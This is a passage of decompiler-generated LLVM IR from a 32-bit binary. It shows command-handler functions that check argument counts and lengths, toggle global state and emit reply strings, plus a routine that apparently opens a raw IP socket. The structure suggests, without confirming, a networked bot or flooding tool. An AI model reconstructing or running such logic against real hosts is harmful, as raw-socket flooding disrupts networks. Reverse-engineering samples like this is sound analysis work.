  uselistorder i32 %storemerge78, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8048e7a, { 1, 0 }
  uselistorder i32 %v5_8048e6883, { 0, 4, 5, 6, 3, 1, 2 }
  uselistorder i32* %v2_8048eaa.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v4_8048e0e, { 1, 0, 2 }
  uselistorder i32 %v4_8048dfd, { 1, 2, 0 }
  uselistorder i32 %storemerge10.in89, { 0, 3, 2, 1 }
  uselistorder i1 %v0_8048d68, { 1, 0 }
  uselistorder i32 %v7_8048d66, { 1, 0 }
  uselistorder i32 %storemerge595, { 2, 0, 3, 1 }
  uselistorder i32 %v4_8048d0c, { 1, 0 }
  uselistorder i32 %v5_8048cfa100, { 7, 8, 3, 0, 2, 1, 9, 10, 6, 4, 5 }
  uselistorder i32 %v2_8048cea, { 3, 1, 4, 2, 5, 0 }
  uselistorder i32 %v3_8048cd2, { 11, 10, 9, 8, 0, 1, 2, 6, 3, 5, 4, 7 }
  uselistorder i32 %v1_8048bad, { 1, 0, 2 }
  uselistorder i32 %storemerge6, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_8048b4c.pre-phi, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v2_8048b29, { 2, 0, 1 }
  uselistorder i1 %v0_8048af1, { 1, 0 }
  uselistorder i32 %v4_8048a86, { 3, 4, 2, 5, 1, 6, 7, 0, 8 }
  uselistorder i32 %v4_8048a43, { 1, 0 }
  uselistorder i32* %stack_var_-1096, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 1, 2 }
  uselistorder i1* %cf.global-to-local, { 21, 24, 22, 23, 0, 25, 26, 1, 27, 34, 30, 28, 29, 2, 31, 32, 33, 3, 35, 36, 4, 37, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 -1092, { 1, 0 }
  uselistorder i32 %arg4, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048f45, { 1, 0 }
  uselistorder label %dec_label_pc_8048f0f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048e7a, { 1, 0 }
  uselistorder label %dec_label_pc_8048e22, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048dfd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048d85, { 1, 0 }
  uselistorder label %dec_label_pc_8048d2c, { 1, 0 }
  uselistorder label %dec_label_pc_8048d0c, { 1, 0 }
  uselistorder label %dec_label_pc_8048c74, { 1, 0 }
  uselistorder label %dec_label_pc_8048c1d, { 1, 0 }
  uselistorder label %dec_label_pc_8048bf8, { 1, 0 }
  uselistorder label %dec_label_pc_8048b49, { 1, 0 }
  uselistorder label %dec_label_pc_8048b3d, { 1, 0 }
  uselistorder label %dec_label_pc_8048aba, { 1, 0 }
  uselistorder label %dec_label_pc_8048a6f, { 1, 0 }
}

define i32 @function_8048f4f(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048f4f:
  %tmp33 = call i8 @__decompiler_undefined_function_5()
  %tmp34 = call i8 @__decompiler_undefined_function_5()
  %v0_8048f58 = load i8*, i8** @global_var_8055e08.11, align 4
  %v1_8048f58 = ptrtoint i8* %v0_8048f58 to i32
  %v0_8048f60 = load i64, i64* @global_var_8055e0c.12, align 8
  %v1_8048f60 = trunc i64 %v0_8048f60 to i32
  %v9_8048f77 = icmp eq i32 %v1_8048f60, 1
  %v1_8048f7a = icmp eq i1 %v9_8048f77, false
  br i1 %v1_8048f7a, label %dec_label_pc_8048fd6, label %dec_label_pc_8048f7c

dec_label_pc_8048f7c:                             ; preds = %dec_label_pc_8048f4f
  %v1_8048f82 = urem i32 %v1_8048f58, 256
  store i32 %v1_8048f82, i32* @ebx, align 4
  %v3_8048fcc = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_8052470.27 to i32))
  br label %dec_label_pc_8049072

dec_label_pc_8048fd6:                             ; preds = %dec_label_pc_8048f4f
  %v3_8048fef17 = zext i8 %tmp34 to i32
  store i32 %v3_8048fef17, i32* @ebx, align 4
  %v3_8048ffb18 = zext i8 %tmp33 to i32
  store i32 %v3_8048ffb18, i32* @esi, align 4
  %v1_8049007 = urem i32 %v1_8048f58, 256
  store i32 %v1_8049007, i32* @edi, align 4
  %v3_804906d = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_8052490.28 to i32))
  br label %dec_label_pc_8049072

dec_label_pc_8049072:                             ; preds = %dec_label_pc_8048f7c, %dec_label_pc_8048fd6
  %storemerge = phi i32 [ %v3_804906d, %dec_label_pc_8048fd6 ], [ %v3_8048fcc, %dec_label_pc_8048f7c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049072, { 1, 0 }
}

define i32 @function_804907a(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804907a:
  %stack_var_-4 = alloca i32, align 4
  %v0_804907a = load i32, i32* @ebp, align 4
  store i32 %v0_804907a, i32* %stack_var_-4, align 4
  %v4_804907a = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804907a, i32* @ebp, align 4
  %v3_8049095 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_80524be.29 to i32))
  ret i32 %v3_8049095

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_804909c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804909c:
  %v12_80490a3 = icmp eq i32 %arg3, 1
  br i1 %v12_80490a3, label %dec_label_pc_80490c5, label %dec_label_pc_80490a9

dec_label_pc_80490a9:                             ; preds = %dec_label_pc_804909c
  %v3_80490be = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_80524db.30 to i32))
  br label %dec_label_pc_8049122

dec_label_pc_80490c5:                             ; preds = %dec_label_pc_804909c
  %v1_80490c8 = add i32 %arg4, 4
  %v1_80490cb = inttoptr i32 %v1_80490c8 to i32*
  %v2_80490cb = load i32, i32* %v1_80490cb, align 4
  store i1 false, i1* @df, align 1
  %v4_80490d8 = inttoptr i32 %v2_80490cb to i8*
  store i32 %v2_80490cb, i32* @edi, align 4
  %v3_80490db = call i32 @_strlen(i8* %v4_80490d8)
  %v4_80490db = mul i32 %v3_80490db, -1
  %v1_80490e1 = sub i32 0, %v4_80490db
  %v5_80490e2 = icmp ult i32 %v1_80490e1, 9
  %v9_80490e2 = icmp eq i32 %v4_80490db, -9
  %v2_80490e5 = or i1 %v5_80490e2, %v9_80490e2
  br i1 %v2_80490e5, label %dec_label_pc_8049103, label %dec_label_pc_80490e7

dec_label_pc_80490e7:                             ; preds = %dec_label_pc_80490c5
  %v3_80490fc = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_80524f4.31 to i32))
  br label %dec_label_pc_8049122

dec_label_pc_8049103:                             ; preds = %dec_label_pc_80490c5
  %v3_804911d = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_8052529.32 to i32))
  br label %dec_label_pc_8049122

dec_label_pc_8049122:                             ; preds = %dec_label_pc_80490e7, %dec_label_pc_80490a9, %dec_label_pc_8049103
  %v0_8049127 = phi i32 [ %v3_80490fc, %dec_label_pc_80490e7 ], [ %v3_80490be, %dec_label_pc_80490a9 ], [ %v3_804911d, %dec_label_pc_8049103 ]
  ret i32 %v0_8049127

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049122, { 2, 0, 1 }
}

define i32 @function_8049128(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8049128:
  %v12_804912f = icmp eq i32 %arg3, 1
  br i1 %v12_804912f, label %dec_label_pc_8049190, label %dec_label_pc_8049135

dec_label_pc_8049135:                             ; preds = %dec_label_pc_8049128
  %v3_804914a = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_8052532.33 to i32))
  %v3_8049186 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_8052574.36 to i32))
  br label %dec_label_pc_804924a

dec_label_pc_8049190:                             ; preds = %dec_label_pc_8049128
  %v0_8049190 = load i8, i8* @global_var_8055e04.6, align 4
  %v4_8049197 = icmp eq i8 %v0_8049190, 0
  br i1 %v4_8049197, label %dec_label_pc_80491ba, label %dec_label_pc_804919b

dec_label_pc_804919b:                             ; preds = %dec_label_pc_8049190
  %v3_80491b0 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_8052597.37 to i32))
  br label %dec_label_pc_804924a

dec_label_pc_80491ba:                             ; preds = %dec_label_pc_8049190
  %v1_80491bd = add i32 %arg4, 4
  %v1_80491c0 = inttoptr i32 %v1_80491bd to i32*
  %v2_80491c0 = load i32, i32* %v1_80491c0, align 4
  store i1 false, i1* @df, align 1
  %v4_80491cd = inttoptr i32 %v2_80491c0 to i8*
  store i32 %v2_80491c0, i32* @edi, align 4
  %v3_80491d0 = call i32 @_strlen(i8* %v4_80491cd)
  %v4_80491d0 = mul i32 %v3_80491d0, -1
  %v1_80491d6 = sub i32 0, %v4_80491d0
  %v5_80491d7 = icmp ult i32 %v1_80491d6, 254
  %v9_80491d7 = icmp eq i32 %v4_80491d0, -254
  %v2_80491dc = or i1 %v5_80491d7, %v9_80491d7
  br i1 %v2_80491dc, label %dec_label_pc_80491fa, label %dec_label_pc_80491de

dec_label_pc_80491de:                             ; preds = %dec_label_pc_80491ba
  %v3_80491f3 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_80525b8.38 to i32))
  br label %dec_label_pc_804924a

dec_label_pc_80491fa:                             ; preds = %dec_label_pc_80491ba
  store i8 1, i8* @global_var_8055e04.6, align 4
  %v5_804921a = call i32 @function_804d1d0(i8* bitcast (i32* @global_var_80584c0.39 to i8*), i32 0, i32 256)
  %v2_8049225 = load i32, i32* %v1_80491c0, align 4
  store i32 %v2_8049225, i32* @eax, align 4
  %v4_8049232 = call i32 @function_804d1e8(i8* bitcast (i32* @global_var_80584c0.39 to i8*), i32 %v2_8049225)
  %v3_8049245 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_80525e0.40 to i32))
  br label %dec_label_pc_804924a

dec_label_pc_804924a:                             ; preds = %dec_label_pc_80491de, %dec_label_pc_804919b, %dec_label_pc_8049135, %dec_label_pc_80491fa
  %v0_804924f = phi i32 [ %v3_80491f3, %dec_label_pc_80491de ], [ %v3_80491b0, %dec_label_pc_804919b ], [ %v3_8049186, %dec_label_pc_8049135 ], [ %v3_8049245, %dec_label_pc_80491fa ]
  ret i32 %v0_804924f

; uselistorder directives
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804924a, { 3, 0, 1, 2 }
}

define i32 @function_8049250(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8049250:
  %v12_8049256 = icmp eq i32 %arg3, 1
  br i1 %v12_8049256, label %dec_label_pc_80492b7, label %dec_label_pc_804925c

dec_label_pc_804925c:                             ; preds = %dec_label_pc_8049250
  %v3_8049271 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_80525ff.41 to i32))
  %v3_80492ad = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_8052574.36 to i32))
  br label %dec_label_pc_8049337

dec_label_pc_80492b7:                             ; preds = %dec_label_pc_8049250
  %v0_80492b7 = load i8, i8* @global_var_8055e04.6, align 4
  %v4_80492be = icmp eq i8 %v0_80492b7, 0
  %v1_80492c0 = icmp eq i1 %v4_80492be, false
  br i1 %v1_80492c0, label %dec_label_pc_80492de, label %dec_label_pc_80492c2

dec_label_pc_80492c2:                             ; preds = %dec_label_pc_80492b7
  %v3_80492d7 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_8052619.42 to i32))
  br label %dec_label_pc_8049337

dec_label_pc_80492de:                             ; preds = %dec_label_pc_80492b7
  %v1_80492e1 = add i32 %arg4, 4
  %v1_80492e4 = inttoptr i32 %v1_80492e1 to i32*
  %v2_80492e4 = load i32, i32* %v1_80492e4, align 4
  %v4_80492f1 = call i32 @function_804d34c(i8* bitcast (i32* @global_var_80584c0.39 to i8*), i32 %v2_80492e4)
  %v1_80492f6 = icmp eq i32 %v4_80492f1, 0
  br i1 %v1_80492f6, label %dec_label_pc_8049316, label %dec_label_pc_80492fa

dec_label_pc_80492fa:                             ; preds = %dec_label_pc_80492de
  %v3_804930f = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_8052636.43 to i32))
  br label %dec_label_pc_8049337

dec_label_pc_8049316:                             ; preds = %dec_label_pc_80492de
  store i8 0, i8* @global_var_8055e04.6, align 4
  %v3_8049332 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_8052651.44 to i32))
  br label %dec_label_pc_8049337

dec_label_pc_8049337:                             ; preds = %dec_label_pc_80492fa, %dec_label_pc_80492c2, %dec_label_pc_804925c, %dec_label_pc_8049316
  %v0_8049338 = phi i32 [ %v3_804930f, %dec_label_pc_80492fa ], [ %v3_80492d7, %dec_label_pc_80492c2 ], [ %v3_80492ad, %dec_label_pc_804925c ], [ %v3_8049332, %dec_label_pc_8049316 ]
  ret i32 %v0_8049338

; uselistorder directives
  uselistorder i8* @global_var_8055e04.6, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049337, { 3, 0, 1, 2 }
}

define i32 @function_8049339(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8049339:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %v12_8049343 = icmp eq i32 %arg3, 1
  br i1 %v12_8049343, label %dec_label_pc_804937c, label %dec_label_pc_8049349

dec_label_pc_8049349:                             ; preds = %dec_label_pc_8049339
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v3_804935e = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_8052670.45 to i32))
  store i32 %v3_804935e, i32* %eax.global-to-local, align 4
  store i8* null, i8** @global_var_8055e08.11, align 8
  store i64 0, i64* @global_var_8055e0c.12, align 8
  br label %dec_label_pc_8049517

dec_label_pc_804937c:                             ; preds = %dec_label_pc_8049339
  %v1_804937f = add i32 %arg4, 4
  store i32 %v1_804937f, i32* %eax.global-to-local, align 4
  %v1_8049382 = inttoptr i32 %v1_804937f to i32*
  %v2_8049382 = load i32, i32* %v1_8049382, align 4
  %v1_804938f = and i32 %v2_8049382, -256
  store i32 %v1_804938f, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8049392 = inttoptr i32 %v2_8049382 to i8*
  store i32 %v2_8049382, i32* @edi, align 4
  %v3_8049398 = call i32 @_strlen(i8* %v4_8049392)
  %v4_8049398 = mul i32 %v3_8049398, -1
  %v1_804939e = sub i32 0, %v4_8049398
  store i32 %v1_804939e, i32* %eax.global-to-local, align 4
  %v2_804939f = icmp ult i32 %v1_804939e, 16
  %v6_804939f = icmp eq i32 %v4_8049398, -16
  %v2_80493a2 = or i1 %v2_804939f, %v6_804939f
  br i1 %v2_80493a2, label %dec_label_pc_80493c3, label %dec_label_pc_80493a4

dec_label_pc_80493a4:                             ; preds = %dec_label_pc_804937c
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v3_80493b9 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_8052690.46 to i32))
  store i32 %v3_80493b9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049517

dec_label_pc_80493c3:                             ; preds = %dec_label_pc_804937c
  store i32 %v1_804937f, i32* %eax.global-to-local, align 4
  %v2_80493c9 = load i32, i32* %v1_8049382, align 4
  %v2_80493cf = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_80493cf, i32* @eax, align 4
  %v3_80493d8 = bitcast i32* %stack_var_-276 to i8*
  %v4_80493d8 = call i32 @function_804d1e8(i8* %v3_80493d8, i32 %v2_80493c9)
  %v2_80493ee = ptrtoint i32* %stack_var_-512 to i32
  store i32 %v2_80493ee, i32* %eax.global-to-local, align 4
  %v3_80493f7 = call i32 @_strlen(i8* %v3_80493d8)
  %v1_80493fe = add i32 %v3_80493f7, -1
  store i32 %v1_80493fe, i32* %eax.global-to-local, align 4
  %v0_80493ff = load i32, i32* @ebp, align 4
  %v2_80493ff = add i32 %v3_80493f7, -273
  %v3_80493ff = add i32 %v2_80493ff, %v0_80493ff
  %v4_80493ff = inttoptr i32 %v3_80493ff to i8*
  %v5_80493ff = load i8, i8* %v4_80493ff, align 1
  %v6_80493ff = zext i8 %v5_80493ff to i32
  store i32 %v6_80493ff, i32* %eax.global-to-local, align 4
  %v10_8049407 = icmp eq i8 %v5_80493ff, 46
  %v1_8049409 = icmp eq i1 %v10_8049407, false
  br i1 %v1_8049409, label %dec_label_pc_804945a, label %dec_label_pc_804940b

dec_label_pc_804940b:                             ; preds = %dec_label_pc_80493c3
  store i32 %v2_80493ee, i32* %eax.global-to-local, align 4
  %v3_8049425 = call i32 @_strlen(i8* %v3_80493d8)
  %v1_804942c = add i32 %v3_8049425, -1
  store i32 %v1_804942c, i32* %eax.global-to-local, align 4
  %v0_804942d = load i32, i32* @ebp, align 4
  %v2_804942d = add i32 %v3_8049425, -273
  %v3_804942d = add i32 %v2_804942d, %v0_804942d
  %v4_804942d = inttoptr i32 %v3_804942d to i8*
  store i8 0, i8* %v4_804942d, align 1
  br label %dec_label_pc_804945a

dec_label_pc_8049445:                             ; preds = %dec_label_pc_804945a
  store i32 %stack_var_-20.0, i32* %eax.global-to-local, align 4
  %v0_8049448 = load i32, i32* @ebp, align 4
  %v2_8049448 = add i32 %stack_var_-20.0, -272
  %v3_8049448 = add i32 %v2_8049448, %v0_8049448
  %v4_8049448 = inttoptr i32 %v3_8049448 to i8*
  %v5_8049448 = load i8, i8* %v4_8049448, align 1
  %v6_8049448 = zext i8 %v5_8049448 to i32
  store i32 %v6_8049448, i32* %eax.global-to-local, align 4
  %v10_8049450 = icmp eq i8 %v5_8049448, 46
  %v1_8049452 = icmp eq i1 %v10_8049450, false
  br i1 %v1_8049452, label %dec_label_pc_8049457, label %dec_label_pc_8049454

dec_label_pc_8049454:                             ; preds = %dec_label_pc_8049445
  %v4_8049454 = add i32 %stack_var_-16.1, 1
  br label %dec_label_pc_8049457

dec_label_pc_8049457:                             ; preds = %dec_label_pc_8049445, %dec_label_pc_8049454
  %stack_var_-16.0 = phi i32 [ %stack_var_-16.1, %dec_label_pc_8049445 ], [ %v4_8049454, %dec_label_pc_8049454 ]
  %v4_8049457 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_804945a

dec_label_pc_804945a:                             ; preds = %dec_label_pc_804940b, %dec_label_pc_80493c3, %dec_label_pc_8049457
  %stack_var_-16.1 = phi i32 [ %stack_var_-16.0, %dec_label_pc_8049457 ], [ 1, %dec_label_pc_80493c3 ], [ 1, %dec_label_pc_804940b ]
  %stack_var_-20.0 = phi i32 [ %v4_8049457, %dec_label_pc_8049457 ], [ 0, %dec_label_pc_80493c3 ], [ 0, %dec_label_pc_804940b ]
  store i32 %stack_var_-20.0, i32* @edx, align 4
  store i32 %v2_80493ee, i32* %eax.global-to-local, align 4
  %v3_8049477 = call i32 @_strlen(i8* %v3_80493d8)
  store i32 %v3_8049477, i32* %eax.global-to-local, align 4
  %v0_804947e = load i32, i32* @edx, align 4
  %v7_804947e = icmp ult i32 %v0_804947e, %v3_8049477
  br i1 %v7_804947e, label %dec_label_pc_8049445, label %dec_label_pc_8049482

dec_label_pc_8049482:                             ; preds = %dec_label_pc_804945a
  %v5_8049487 = sub i32 4, %stack_var_-16.1
  %v15_8049487 = icmp eq i32 %v5_8049487, 0
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_80494d227 = icmp sgt i32 %v5_8049487, 0
  br i1 %v5_80494d227, label %dec_label_pc_8049496, label %dec_label_pc_80494d4

dec_label_pc_8049496:                             ; preds = %dec_label_pc_8049482, %dec_label_pc_8049496
  %storemerge228 = phi i32 [ %v4_80494c9, %dec_label_pc_8049496 ], [ 0, %dec_label_pc_8049482 ]
  store i32 %v2_80493cf, i32* @edx, align 4
  store i32 %v2_80493ee, i32* %eax.global-to-local, align 4
  %v3_80494b6 = call i32 @_strlen(i8* %v3_80493d8)
  %v0_80494bd = load i32, i32* @edx, align 4
  %v0_80494bd29 = add i32 %v0_80494bd, %v3_80494b6
  store i32 %v0_80494bd29, i32* %eax.global-to-local, align 4
  %v1_80494c0 = inttoptr i32 %v0_80494bd29 to i16*
  store i16 12334, i16* %v1_80494c0, align 2
  %v0_80494c5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80494c5 = add i32 %v0_80494c5, 2
  %v2_80494c5 = inttoptr i32 %v1_80494c5 to i8*
  store i8 0, i8* %v2_80494c5, align 1
  %v4_80494c9 = add nuw nsw i32 %storemerge228, 1
  store i32 %v4_80494c9, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_80494c9, %v5_8049487
  br i1 %exitcond, label %dec_label_pc_80494d4, label %dec_label_pc_8049496

dec_label_pc_80494d4:                             ; preds = %dec_label_pc_8049496, %dec_label_pc_8049482
  store i32 %v2_80493cf, i32* @eax, align 4
  %v2_80494dd = call i32 @function_804d490(i8* %v3_80493d8)
  store i32 %v2_80494dd, i32* %eax.global-to-local, align 4
  %v1_80494e9 = icmp eq i1 %v15_8049487, false
  br i1 %v1_80494e9, label %dec_label_pc_80494f7, label %dec_label_pc_804950f

dec_label_pc_80494f7:                             ; preds = %dec_label_pc_80494d4
  store i32 %v5_8049487, i32* %eax.global-to-local, align 4
  %v4_8049505 = call i32 @function_8048965(i64 256, i32 %v5_8049487)
  store i32 %v4_8049505, i32* %eax.global-to-local, align 4
  %v1_804950a = sext i32 %v4_8049505 to i64
  br label %dec_label_pc_804950f

dec_label_pc_804950f:                             ; preds = %dec_label_pc_80494d4, %dec_label_pc_80494f7
  %storemerge = phi i64 [ %v1_804950a, %dec_label_pc_80494f7 ], [ 1, %dec_label_pc_80494d4 ]
  store i64 %storemerge, i64* @global_var_8055e0c.12, align 8
  store i32 %v2_80494dd, i32* %eax.global-to-local, align 4
  %v1_8049512 = inttoptr i32 %v2_80494dd to i8*
  store i8* %v1_8049512, i8** @global_var_8055e08.11, align 8
  br label %dec_label_pc_8049517

dec_label_pc_8049517:                             ; preds = %dec_label_pc_80493a4, %dec_label_pc_8049349, %dec_label_pc_804950f
  %v0_804951f = phi i32 [ %v3_80493b9, %dec_label_pc_80493a4 ], [ %v3_804935e, %dec_label_pc_8049349 ], [ %v2_80494dd, %dec_label_pc_804950f ]
  ret i32 %v0_804951f

; uselistorder directives
  uselistorder i32 %v2_80494dd, { 0, 2, 1, 3 }
  uselistorder i32 %v4_80494c9, { 1, 2, 0 }
  uselistorder i32 %v5_8049487, { 3, 2, 0, 1, 4 }
  uselistorder i32 %stack_var_-20.0, { 3, 2, 0, 1 }
  uselistorder i32 %v2_80493ee, { 1, 2, 0, 3 }
  uselistorder i8* %v3_80493d8, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v2_80493cf, { 1, 0, 2 }
  uselistorder i32 %v1_804939e, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 3, 2, 6, 8, 4, 5, 7, 0, 11, 12, 9, 10, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 25, 24 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049517, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804950f, { 1, 0 }
  uselistorder label %dec_label_pc_8049496, { 1, 0 }
  uselistorder label %dec_label_pc_804945a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049457, { 1, 0 }
}

define i32 @function_8049520(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8049520:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049520 = load i32, i32* @ebp, align 4
  store i32 %v0_8049520, i32* %stack_var_-4, align 4
  %v4_8049520 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8049520, i32* @ebp, align 4
  %v1_804952c = call i32 @function_804d570(i32 %arg2)
  store i32 %v1_804952c, i32* @global_var_8056220.47, align 32
  %v10_804953b = icmp eq i32 %v1_804952c, -1
  %v1_804953e = icmp eq i1 %v10_804953b, false
  br i1 %v1_804953e, label %dec_label_pc_80495a8, label %dec_label_pc_8049540

dec_label_pc_8049540:                             ; preds = %dec_label_pc_8049520
  %v1_8049546 = call i32 @function_804d598(i32 %arg2)
  %v4_804954e = icmp eq i32 %v1_8049546, 0
  %v1_8049552 = icmp eq i1 %v4_804954e, false
  br i1 %v1_8049552, label %dec_label_pc_8049583, label %dec_label_pc_8049554

dec_label_pc_8049554:                             ; preds = %dec_label_pc_8049540
  %v0_8049554 = load i32, i32* @global_var_80585c8.7, align 8
  %v2_8049572 = call i32 @function_80482b3(i32 %v0_8049554, i32 ptrtoint ([33 x i8]* @global_var_80526dc.48 to i32))
  store i32 %v2_8049572, i32* @eax, align 4
  %v1_804957e = call i32 @function_804ec2c(i32 0)
  br label %dec_label_pc_8049583

dec_label_pc_8049583:                             ; preds = %dec_label_pc_8049540, %dec_label_pc_8049554
  %v1_8049586 = add i32 %v1_8049546, 12
  %v2_8049586 = inttoptr i32 %v1_8049586 to i32*
  %v3_8049586 = load i32, i32* %v2_8049586, align 4
  %v1_8049593 = add i32 %v1_8049546, 16
  %v2_8049593 = inttoptr i32 %v1_8049593 to i32*
  %v3_8049593 = load i32, i32* %v2_8049593, align 4
  %v1_8049596 = inttoptr i32 %v3_8049593 to i32*
  %v2_8049596 = load i32, i32* %v1_8049596, align 4
  %v3_80495a3 = call i32 @function_804d334(i32 %v2_8049596, i32 ptrtoint (i32* @global_var_8056220.47 to i32), i32 %v3_8049586)
  %v0_80495a8.pre = load i32, i32* @global_var_8056220.47, align 32
  br label %dec_label_pc_80495a8

dec_label_pc_80495a8:                             ; preds = %dec_label_pc_8049520, %dec_label_pc_8049583
  %v0_80495a8 = phi i32 [ %v1_804952c, %dec_label_pc_8049520 ], [ %v0_80495a8.pre, %dec_label_pc_8049583 ]
  %v2_80495ad = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80495ad, i32* @ebp, align 4
  ret i32 %v0_80495a8

; uselistorder directives
  uselistorder i32 %v1_804952c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80495a8, { 1, 0 }
  uselistorder label %dec_label_pc_8049583, { 1, 0 }
}

define i32 @function_80495af(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80495af:
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-1532 = alloca i32, align 4
  %stack_var_-1540 = alloca i32, align 4
  %stack_var_-1560 = alloca i32, align 4
  %stack_var_-1596 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80495af = load i32, i32* @ebp, align 4
  store i32 %v0_80495af, i32* %stack_var_-4, align 4
  %v4_80495af = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80495af, i32* @ebp, align 4
  store i32 0, i32* %stack_var_-1596, align 4
  %v2_80495c6 = call i32 @function_804b750(i32* null)
  store i32 %arg2, i32* %stack_var_-1596, align 4
  %v1_80495d4 = call i32 @function_8048311(i32 %arg2)
  %v1_80495d9 = icmp eq i32 %v1_80495d4, 0
  %v1_80495db = icmp eq i1 %v1_80495d9, false
  br i1 %v1_80495db, label %dec_label_pc_804985d, label %dec_label_pc_80495e1

dec_label_pc_80495e1:                             ; preds = %dec_label_pc_80495af
  store i32 2, i32* %stack_var_-1596, align 4
  %v4_80495f8 = call i32 @function_804da58(i32 2, i32 3, i32 255)
  store i32 %v4_80495f8, i32* @eax, align 4
  %v5_8049600 = icmp slt i32 %v4_80495f8, 0
  %v1_8049604 = icmp eq i1 %v5_8049600, false
  br i1 %v1_8049604, label %dec_label_pc_8049612, label %dec_label_pc_8049606

dec_label_pc_8049606:                             ; preds = %dec_label_pc_80495e1
  store i32 1, i32* %stack_var_-1596, align 4
  %v1_804960d = call i32 @function_804ec2c(i32 1)
  br label %dec_label_pc_8049612

dec_label_pc_8049612:                             ; preds = %dec_label_pc_80495e1, %dec_label_pc_8049606
  %v4_8049612 = add i32 %arg3, -2
  %v9_8049612 = sub i32 1, %arg3
  %v10_8049612 = and i32 %v9_8049612, %arg3
  %v11_8049612 = icmp slt i32 %v10_8049612, 0
  %v12_8049612 = icmp eq i32 %v4_8049612, 0
  %v13_8049612 = icmp slt i32 %v4_8049612, 0
  %v3_8049616 = icmp eq i1 %v13_8049612, %v11_8049612
  %v4_8049616 = icmp eq i1 %v12_8049612, false
